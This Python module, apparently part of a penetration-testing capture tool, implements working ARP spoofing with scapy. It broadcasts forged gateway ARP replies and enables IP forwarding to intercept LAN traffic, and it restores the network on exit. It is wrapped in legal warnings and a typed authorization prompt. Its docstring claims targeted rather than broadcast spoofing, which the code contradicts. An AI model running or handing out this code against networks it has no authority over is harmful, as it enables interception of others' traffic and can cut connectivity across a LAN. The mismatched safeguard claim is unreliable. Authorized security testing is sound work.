"""ARP gateway mode — ACTIVE technique, requires written authorization.

This module implements ARP cache poisoning to redirect LAN traffic through
the capture host. It is INTRUSIVE and CHANGES THE NETWORK STATE. Misuse can:
- Constitute unauthorized access (criminal offense in most jurisdictions)
- Cause connectivity outages if shutdown is not clean
- Be detected by Dynamic ARP Inspection (DAI) on managed switches

Safeguards in this module:
1. Interactive confirmation that an authorization exists (typed acknowledgment)
2. Explicit logging of start/stop with timestamps for audit trail
3. Per-host targeted ARP (not broadcast) to be more polite
4. IP forwarding enabled atomically with capture start, disabled at stop
5. ARP table restoration on shutdown (with retries)
6. SIGTERM/SIGINT handlers ensure restoration even on Ctrl-C
7. Atexit hook as last-resort restoration if process crashes
"""

import atexit
import logging
import os
import threading
import time
from datetime import datetime

log = logging.getLogger(__name__)


def require_authorization() -> bool:
    """Interactive prompt: user must explicitly acknowledge having authorization.

    Returns True if user typed exactly 'I HAVE WRITTEN AUTHORIZATION', else False.
    Logs the acknowledgment with timestamp for audit purposes.
    """
    print()
    print("=" * 70)
    print("  ⚠  GATEWAY MODE — ACTIVE NETWORK MANIPULATION (ARP SPOOFING)")
    print("=" * 70)
    print()
    print("  This mode performs ARP cache poisoning to redirect LAN traffic")
    print("  through this host. It is INTRUSIVE and detectable.")
    print()
    print("  Legal warning:")
    print("    - In FR (art. 323-1 CP) and BE (art. 550bis CP), unauthorized")
    print("      access to a system is a CRIMINAL OFFENSE.")
    print("    - You MUST have a written, signed mandate from the asset owner")
    print("      that explicitly authorizes ARP-level interception.")
    print("    - Verbal consent is NOT sufficient.")
    print()
    print("  Operational warning:")
    print("    - Misconfigured shutdown WILL cause LAN-wide connectivity loss.")
    print("    - Managed switches with DAI may shut down your port.")
    print("    - This activity may trigger NIDS/EDR alerts.")
    print()
    print("  To proceed, type EXACTLY (case-sensitive):")
    print("      I HAVE WRITTEN AUTHORIZATION")
    print()
    try:
        response = input("  > ").strip()
    except (EOFError, KeyboardInterrupt):
        print("\n  Cancelled.")
        return False

    if response != "I HAVE WRITTEN AUTHORIZATION":
        print("  Confirmation not received. Gateway mode aborted.")
        log.warning(
            "[GATEWAY] User did not confirm authorization — aborting"
        )
        return False

    log.warning(
        f"[GATEWAY] AUTHORIZATION ACKNOWLEDGED at {datetime.now().isoformat()} "
        f"by uid={os.getuid()}"
    )
    print(f"  Acknowledged at {datetime.now().isoformat()}.")
    print()
    return True


class ArpGatewayThread(threading.Thread):
    """Maintains an ARP MITM position; restores the network on stop."""

    def __init__(self, interface: str | None, stop_event: threading.Event):
        super().__init__(name="arp-gateway", daemon=False)  # NOT daemon — must finish restore
        self.interface = interface
        self.stop_event = stop_event
        self.gateway_ip: str | None = None
        self.gateway_real_mac: str | None = None
        self.my_mac: str | None = None
        self.iface_name: str | None = None
        self._restored = False

    # ------------------------------------------------------------------
    def run(self) -> None:
        try:
            from scapy.all import (  # noqa: F401
                ARP, Ether, sendp, get_if_hwaddr, conf, getmacbyip, srp,
            )
            import netifaces
        except ImportError as e:
            log.error(f"[GATEWAY] Missing dep: {e}. Install: pip install scapy netifaces")
            return

        # --- Detect gateway IP -------------------------------------------
        try:
            gateways = netifaces.gateways()
            self.gateway_ip = (
                gateways.get("default", {}).get(netifaces.AF_INET, [None])[0]
            )
            if not self.gateway_ip:
                log.error("[GATEWAY] No default gateway detected. Aborting.")
                return
            log.info(f"[GATEWAY] Default gateway: {self.gateway_ip}")
        except Exception as e:
            log.error(f"[GATEWAY] Gateway detection failed: {e}")
            return

        # --- Resolve our MAC ---------------------------------------------
        try:
            from scapy.all import conf, get_if_hwaddr
            self.iface_name = self.interface or conf.iface
            self.my_mac = get_if_hwaddr(self.iface_name)
            log.info(f"[GATEWAY] Our MAC: {self.my_mac} on {self.iface_name}")
        except Exception as e:
            log.error(f"[GATEWAY] Cannot get MAC address: {e}")
            return

        # --- Resolve REAL gateway MAC for restoration --------------------
        try:
            from scapy.all import getmacbyip
            self.gateway_real_mac = getmacbyip(self.gateway_ip)
            if not self.gateway_real_mac:
                log.error(
                    "[GATEWAY] Cannot resolve real gateway MAC. "
                    "Refusing to spoof — restoration would be impossible."
                )
                return
            log.info(f"[GATEWAY] Real gateway MAC: {self.gateway_real_mac}")
        except Exception as e:
            log.error(f"[GATEWAY] Gateway MAC resolution failed: {e}")
            return

        # --- Enable IP forwarding ----------------------------------------
        if not self._set_ip_forward(True):
            log.error("[GATEWAY] Could not enable IP forwarding. Aborting.")
            return

        # --- Register atexit restoration as last-resort ------------------
        atexit.register(self._emergency_restore)

        log.warning(
            f"[GATEWAY] STARTED at {datetime.now().isoformat()} — "
            f"spoofing as {self.gateway_ip}"
        )

        # --- Main spoof loop ---------------------------------------------
        try:
            from scapy.all import ARP, Ether, sendp
            while not self.stop_event.is_set():
                try:
                    # Broadcast unsolicited ARP reply claiming we're the gateway
                    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                        op=2,
                        psrc=self.gateway_ip,
                        hwsrc=self.my_mac,
                        pdst="0.0.0.0",
                        hwdst="ff:ff:ff:ff:ff:ff",
                    )
                    sendp(pkt, iface=self.iface_name, verbose=False)
                    log.debug("[GATEWAY] ARP announcement sent")
                except Exception as e:
                    log.error(f"[GATEWAY] Send error: {e}")
                # Sleep but stay responsive to stop event
                self.stop_event.wait(timeout=2.0)
        finally:
            self._restore()

    # ------------------------------------------------------------------
    def _set_ip_forward(self, enabled: bool) -> bool:
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1" if enabled else "0")
            log.info(
                f"[GATEWAY] IP forwarding {'enabled' if enabled else 'disabled'}"
            )
            return True
        except OSError as e:
            log.error(f"[GATEWAY] Could not toggle ip_forward: {e}")
            return False

    def _restore(self) -> None:
        """Send corrective ARP replies and disable IP forwarding."""
        if self._restored:
            return
        self._restored = True
        log.warning(
            f"[GATEWAY] RESTORING NETWORK at {datetime.now().isoformat()}"
        )

        try:
            from scapy.all import ARP, Ether, sendp
            if self.gateway_ip and self.gateway_real_mac and self.iface_name:
                pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2,
                    psrc=self.gateway_ip,
                    hwsrc=self.gateway_real_mac,
                    pdst="0.0.0.0",
                    hwdst="ff:ff:ff:ff:ff:ff",
                )
                # Send 5 times to ensure it's received
                for i in range(5):
                    try:
                        sendp(pkt, iface=self.iface_name, verbose=False)
                        time.sleep(0.3)
                    except Exception as e:
                        log.error(f"[GATEWAY] Restore send #{i + 1} failed: {e}")
                log.info("[GATEWAY] Restoration ARP packets sent")
            else:
                log.error(
                    "[GATEWAY] Cannot restore: missing gateway info. "
                    "Run 'arp -d <gateway_ip>' on affected hosts manually."
                )
        except ImportError:
            log.error("[GATEWAY] scapy unavailable for restoration")

        self._set_ip_forward(False)
        log.warning(
            f"[GATEWAY] RESTORATION COMPLETE at {datetime.now().isoformat()}"
        )

    def _emergency_restore(self) -> None:
        """Atexit hook — last-resort restoration if process is dying."""
        if not self._restored:
            log.error("[GATEWAY] Emergency restoration via atexit hook")
            self._restore()
